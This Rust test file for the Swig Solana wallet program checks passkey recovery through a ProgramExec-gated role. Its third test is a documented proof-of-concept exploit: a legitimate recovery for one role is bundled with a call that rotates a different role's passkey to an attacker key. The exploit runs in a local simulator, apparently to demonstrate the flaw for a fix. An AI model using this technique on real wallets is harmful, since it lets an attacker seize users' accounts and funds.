#![cfg(not(feature = "program_scope_test"))]

mod common;

use common::*;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    message::{v0, VersionedMessage},
    pubkey::Pubkey,
    signature::Keypair,
    signer::Signer,
    sysvar::clock::Clock,
    transaction::VersionedTransaction,
};
use swig_interface::{AuthorityConfig, ClientAction, RecoverAuthorityInstruction};
use swig_state::{
    action::{manage_authority::ManageAuthority, recovery_authority::RecoveryAuthority},
    authority::{programexec::ProgramExecAuthority, secp256r1::Secp256r1Authority, AuthorityType},
    swig::{swig_account_seeds, swig_wallet_address_seeds, SwigWithRoles},
};

solana_sdk::declare_id!("BXAu5ZWHnGun2XZjUZ9nqwiZ5dNVmofPGYdMC4rx4qLV");

const TEST_PROGRAM_ID: Pubkey = ID;
const TEST_PROGRAM_PATH: &str = "../target/deploy/test_program_authority.so";
const VALID_DISCRIMINATOR: [u8; 8] = [1, 2, 3, 4, 5, 6, 7, 8];

fn deploy_test_program(context: &mut SwigTestContext) -> anyhow::Result<()> {
    let program_data = std::fs::read(TEST_PROGRAM_PATH).map_err(|e| {
        anyhow::anyhow!(
            "Failed to read test program: {}. Make sure to run `cargo build-sbf` first.",
            e
        )
    })?;
    context.svm.add_program(TEST_PROGRAM_ID, &program_data)?;
    Ok(())
}

fn set_test_program_state(
    context: &mut SwigTestContext,
    state_account: Pubkey,
) -> anyhow::Result<()> {
    context.svm.set_account(
        state_account,
        Account {
            lamports: 1_000_000,
            data: vec![0],
            owner: TEST_PROGRAM_ID,
            executable: false,
            rent_epoch: 0,
        },
    )?;
    Ok(())
}

fn create_test_secp256r1_public_key() -> [u8; 33] {
    use openssl::{
        bn::BigNumContext,
        ec::{EcGroup, EcKey, PointConversionForm},
        nid::Nid,
    };

    let group = EcGroup::from_curve_name(Nid::X9_62_PRIME256V1).unwrap();
    let signing_key = EcKey::generate(&group).unwrap();
    let mut ctx = BigNumContext::new().unwrap();
    signing_key
        .public_key()
        .to_bytes(&group, PointConversionForm::COMPRESSED, &mut ctx)
        .unwrap()
        .try_into()
        .unwrap()
}

fn recovery_program_instruction(
    swig: Pubkey,
    swig_wallet_address: Pubkey,
    state_account: Pubkey,
) -> Instruction {
    Instruction {
        program_id: TEST_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(swig, false),
            AccountMeta::new_readonly(swig_wallet_address, false),
            AccountMeta::new_readonly(state_account, false),
            AccountMeta::new_readonly(program_id(), false),
        ],
        data: VALID_DISCRIMINATOR.to_vec(),
    }
}

fn send_recovery_transaction(
    context: &mut SwigTestContext,
    instructions: &[Instruction],
) -> Result<(), litesvm::types::FailedTransactionMetadata> {
    let msg = v0::Message::try_compile(
        &context.default_payer.pubkey(),
        instructions,
        &[],
        context.svm.latest_blockhash(),
    )
    .unwrap();
    let tx = VersionedTransaction::try_new(VersionedMessage::V0(msg), &[&context.default_payer])
        .unwrap();
    context.svm.send_transaction(tx).map(|_| ())
}

#[test_log::test]
fn test_program_exec_recovery_rotates_passkey_authority() {
    let mut context = setup_test_context().unwrap();
    let root_authority = Keypair::new();
    let recovery_state = Keypair::new();

    deploy_test_program(&mut context).unwrap();
    set_test_program_state(&mut context, recovery_state.pubkey()).unwrap();
    context
        .svm
        .airdrop(&root_authority.pubkey(), 10_000_000_000)
        .unwrap();

    let old_passkey = create_test_secp256r1_public_key();
    let new_passkey = create_test_secp256r1_public_key();
    let id = rand::random::<[u8; 32]>();
    let swig = Pubkey::find_program_address(&swig_account_seeds(&id), &program_id()).0;
    let swig_wallet_address =
        Pubkey::find_program_address(&swig_wallet_address_seeds(swig.as_ref()), &program_id()).0;

    create_swig_ed25519(&mut context, &root_authority, id).unwrap();

    add_authority_with_ed25519_root(
        &mut context,
        &swig,
        &root_authority,
        AuthorityConfig {
            authority_type: AuthorityType::Secp256r1,
            authority: &old_passkey,
        },
        vec![ClientAction::ManageAuthority(ManageAuthority {})],
    )
    .unwrap();

    let test_program_id_bytes = TEST_PROGRAM_ID.to_bytes();
    let program_exec_data =
        ProgramExecAuthority::create_authority_data(&test_program_id_bytes, &VALID_DISCRIMINATOR);
    add_authority_with_ed25519_root(
        &mut context,
        &swig,
        &root_authority,
        AuthorityConfig {
            authority_type: AuthorityType::ProgramExec,
            authority: &program_exec_data,
        },
        vec![ClientAction::RecoveryAuthority(RecoveryAuthority {})],
    )
    .unwrap();

    let preflight_ix =
        recovery_program_instruction(swig, swig_wallet_address, recovery_state.pubkey());
    let instructions = RecoverAuthorityInstruction::new_with_program_exec(
        swig,
        swig_wallet_address,
        preflight_ix,
        2,
        1,
        old_passkey,
        new_passkey,
    )
    .unwrap();

    send_recovery_transaction(&mut context, &instructions).unwrap();

    let swig_account = context.svm.get_account(&swig).unwrap();
    let swig_state = SwigWithRoles::from_bytes(&swig_account.data).unwrap();
    let recovered_role = swig_state.get_role(1).unwrap().unwrap();
    let recovered_authority = recovered_role
        .authority
        .as_any()
        .downcast_ref::<Secp256r1Authority>()
        .unwrap();

    assert_eq!(recovered_authority.public_key, new_passkey);
    assert_eq!(recovered_authority.signature_odometer, 0);
    assert!(recovered_role
        .get_action::<ManageAuthority>(&[])
        .unwrap()
        .is_some());
}

#[test_log::test]
fn test_program_exec_recovery_requires_recovery_authority_permission() {
    let mut context = setup_test_context().unwrap();
    let root_authority = Keypair::new();
    let recovery_state = Keypair::new();

    deploy_test_program(&mut context).unwrap();
    set_test_program_state(&mut context, recovery_state.pubkey()).unwrap();
    context
        .svm
        .airdrop(&root_authority.pubkey(), 10_000_000_000)
        .unwrap();

    let old_passkey = create_test_secp256r1_public_key();
    let new_passkey = create_test_secp256r1_public_key();
    let id = rand::random::<[u8; 32]>();
    let swig = Pubkey::find_program_address(&swig_account_seeds(&id), &program_id()).0;
    let swig_wallet_address =
        Pubkey::find_program_address(&swig_wallet_address_seeds(swig.as_ref()), &program_id()).0;

    create_swig_ed25519(&mut context, &root_authority, id).unwrap();
    add_authority_with_ed25519_root(
        &mut context,
        &swig,
        &root_authority,
        AuthorityConfig {
            authority_type: AuthorityType::Secp256r1,
            authority: &old_passkey,
        },
        vec![ClientAction::ManageAuthority(ManageAuthority {})],
    )
    .unwrap();

    let test_program_id_bytes = TEST_PROGRAM_ID.to_bytes();
    let program_exec_data =
        ProgramExecAuthority::create_authority_data(&test_program_id_bytes, &VALID_DISCRIMINATOR);
    add_authority_with_ed25519_root(
        &mut context,
        &swig,
        &root_authority,
        AuthorityConfig {
            authority_type: AuthorityType::ProgramExec,
            authority: &program_exec_data,
        },
        vec![ClientAction::ManageAuthority(ManageAuthority {})],
    )
    .unwrap();

    let preflight_ix =
        recovery_program_instruction(swig, swig_wallet_address, recovery_state.pubkey());
    let instructions = RecoverAuthorityInstruction::new_with_program_exec(
        swig,
        swig_wallet_address,
        preflight_ix,
        2,
        1,
        old_passkey,
        new_passkey,
    )
    .unwrap();

    assert!(send_recovery_transaction(&mut context, &instructions).is_err());

    let swig_account = context.svm.get_account(&swig).unwrap();
    let swig_state = SwigWithRoles::from_bytes(&swig_account.data).unwrap();
    let recovered_role = swig_state.get_role(1).unwrap().unwrap();
    let recovered_authority = recovered_role
        .authority
        .as_any()
        .downcast_ref::<Secp256r1Authority>()
        .unwrap();

    assert_eq!(recovered_authority.public_key, old_passkey);
}

// BUG Demo — against the real swig-recovery program.
//
// Setup:
//   - Wallet has two passkey roles: 
//     Role 1 (primary) - secp256r1 authority which is for recovry
//     role 2 (secondary, with Manage or worse ALL permissions). 
//     Role 3 is a ProgramExec/RecoveryAuthority role, used for recovery
//
//   - The swig-rec program is configured for role 1 with the user's
//     primary passkey as old_authority and a chosen new_legit_passkey as
//     new_authority. The guardian starts the recovery normally. The
//     timelock elapses.
//
// Attack: a single transaction with two instructions:
//   [0] swi-rec execute_recovery_v1 ix — supplies (primary, new_legit)
//       so its old/new authority hashes match the pending state. This marks
//       pending(role=1) Executed. accounts[0]=swig, accounts[1]=swig_wallet
//       so the swig ProgramExec gate is satisfied.
//   [1] swig.RecoverAuthorityV1(target_role_id=2, old=secondary, new=attacker)
//       — the args address role 2, NOT role 1. Swig does not read the
//       pending state and the ProgramExec gate does not bind the target
//       role or the new authority.
//
// Outcome: role 2's passkey is rotated to attacker_passkey. Role 1 — the
// actual subject of the legitimate recovery — is untouched, but its
// pending recovery slot is now `Executed`, and the legit flow is denied
#[test_log::test]
fn bug_recovery_role_can_rotate_unrelated_passkey() {
    let mut context = setup_test_context().unwrap();
    let root_authority = Keypair::new();

    // Load the real swig-recovery program at its declared ID.
    let recovery_program_id = Pubkey::new_from_array(swig_recovery::ID.to_bytes());
    let recovery_so = std::fs::read("../target/deploy/swig_recovery.so")
        .expect("Run `cargo build-sbf` first to produce swig_recovery.so");
    context
        .svm
        .add_program(recovery_program_id, &recovery_so)
        .unwrap();

    context
        .svm
        .airdrop(&root_authority.pubkey(), 10_000_000_000)
        .unwrap();

    let primary_passkey = create_test_secp256r1_public_key();
    let secondary_passkey = create_test_secp256r1_public_key();
    let new_legit_passkey = create_test_secp256r1_public_key();
    let attacker_passkey = create_test_secp256r1_public_key();

    let guardian = Keypair::new();
    let operator = Keypair::new();
    context
        .svm
        .airdrop(&guardian.pubkey(), 1_000_000_000)
        .unwrap();
    context
        .svm
        .airdrop(&operator.pubkey(), 1_000_000_000)
        .unwrap();

    let id = rand::random::<[u8; 32]>();
    let swig_conf = Pubkey::find_program_address(&swig_account_seeds(&id), &program_id()).0;
    let swig_wallet =
        Pubkey::find_program_address(&swig_wallet_address_seeds(swig_conf.as_ref()), &program_id()).0;

    create_swig_ed25519(&mut context, &root_authority, id).unwrap();

    // Role 1: primary passkey
    add_authority_with_ed25519_root(
        &mut context,
        &swig_conf,
        &root_authority,
        AuthorityConfig {
            authority_type: AuthorityType::Secp256r1,
            authority: &primary_passkey,
        },
        vec![ClientAction::ManageAuthority(ManageAuthority {})],
    )
    .unwrap();

    // Role 2: second secp256r1 authority, with Manage action
    add_authority_with_ed25519_root(
        &mut context,
        &swig_conf,
        &root_authority,
        AuthorityConfig {
            authority_type: AuthorityType::Secp256r1,
            authority: &secondary_passkey,
        },
        vec![ClientAction::ManageAuthority(ManageAuthority {})],
    )
    .unwrap();

    // Role 3: recovery role gated by the real swig-recovery program.
    let recovery_program_id_bytes = recovery_program_id.to_bytes();
    let program_exec_data = ProgramExecAuthority::create_authority_data(
        &recovery_program_id_bytes,
        &swig_recovery::instruction::EXECUTE_RECOVERY_V1_DISCRIMINATOR,
    );
    add_authority_with_ed25519_root(
        &mut context,
        &swig_conf,
        &root_authority,
        AuthorityConfig {
            authority_type: AuthorityType::ProgramExec,
            authority: &program_exec_data,
        },
        vec![ClientAction::RecoveryAuthority(RecoveryAuthority {})],
    )
    .unwrap();

    // ----- Legitimate recovery flow against role 1 -----

    let delay_slots = 10u64;
    let org_config_placeholder = Pubkey::new_unique();

    // configure_recovery_v1: the recovery program accepts any signer as
    // "operator" — it does not validate operator identity or require the
    // wallet owner to approve.
    let configure_ix = swig_recovery::instruction::configure_recovery_v1_instruction(
        recovery_program_id,
        context.default_payer.pubkey(),
        operator.pubkey(),
        org_config_placeholder,
        swig_wallet,
        1,
        guardian.pubkey(),
        delay_slots,
    );
    submit(&mut context, &[configure_ix], &[&operator]);

    // Guardian starts the legitimate recovery: rotate role 1's primary
    // passkey to new_legit_passkey after the timelock.
    let start_ix = swig_recovery::instruction::start_recovery_v1_instruction(
        recovery_program_id,
        context.default_payer.pubkey(),
        guardian.pubkey(),
        swig_wallet,
        1,
        primary_passkey,
        new_legit_passkey,
    );
    submit(&mut context, &[start_ix], &[&guardian]);

    // Wait till cooldown.
    context.svm.warp_to_slot(context.svm.get_sysvar::<Clock>().slot + delay_slots + 1);
    context.svm.expire_blockhash();

    // ----- Attack transaction -----

    let execute_ix = swig_recovery::instruction::execute_recovery_v1_instruction(
        recovery_program_id,
        swig_conf,                // accounts[0] — ProgramExec gate expects swig here
        swig_wallet, // accounts[1] — ProgramExec gate expects this here
        1,                   // pending PDA for role 1 (the only one that exists)
        primary_passkey,     // matches pending.old_authority_hash
        new_legit_passkey,   // matches pending.new_authority_hash
    );
    let attack_ixs = RecoverAuthorityInstruction::new_with_program_exec(
        swig_conf,
        swig_wallet,
        execute_ix,
        3,                 // acting recovery role
        2,                 // target = role 2, NOT role 1
        secondary_passkey, // current secondary passkey
        attacker_passkey,  // attacker-chosen replacement
    )
    .unwrap();

    // BUG: this succeeds. swig has no way to know the executing recovery
    // was about role 1, not role 2.
    send_recovery_transaction(&mut context, &attack_ixs).unwrap();

    // Verify the damage.
    let swig_account = context.svm.get_account(&swig_conf).unwrap();
    let swig_state = SwigWithRoles::from_bytes(&swig_account.data).unwrap();

    let role_two = swig_state.get_role(2).unwrap().unwrap();
    let role_two_authority = role_two
        .authority
        .as_any()
        .downcast_ref::<Secp256r1Authority>()
        .unwrap();
    assert_eq!(
        role_two_authority.public_key, attacker_passkey,
        "BUG: secondary passkey was rotated to attacker's key, despite the \
         executing recovery being for role 1",
    );

    // Role 1 untouched — and the legitimate recovery for role 1 is now
    // wedged because pending(role=1).status == Executed.
    let role_one = swig_state.get_role(1).unwrap().unwrap();
    let role_one_authority = role_one
        .authority
        .as_any()
        .downcast_ref::<Secp256r1Authority>()
        .unwrap();
    assert_eq!(
        role_one_authority.public_key, primary_passkey,
        "primary passkey was not actually rotated, but its pending slot has \
         been silently marked Executed",
    );
}

fn submit(
    context: &mut SwigTestContext,
    instructions: &[Instruction],
    extra_signers: &[&Keypair],
) {
    context.svm.expire_blockhash();
    let msg = v0::Message::try_compile(
        &context.default_payer.pubkey(),
        instructions,
        &[],
        context.svm.latest_blockhash(),
    )
    .unwrap();
    let payer = context.default_payer.insecure_clone();
    let mut signers: Vec<&Keypair> = vec![&payer];
    signers.extend_from_slice(extra_signers);
    let tx = VersionedTransaction::try_new(VersionedMessage::V0(msg), signers.as_slice()).unwrap();
    context.svm.send_transaction(tx).unwrap();
}
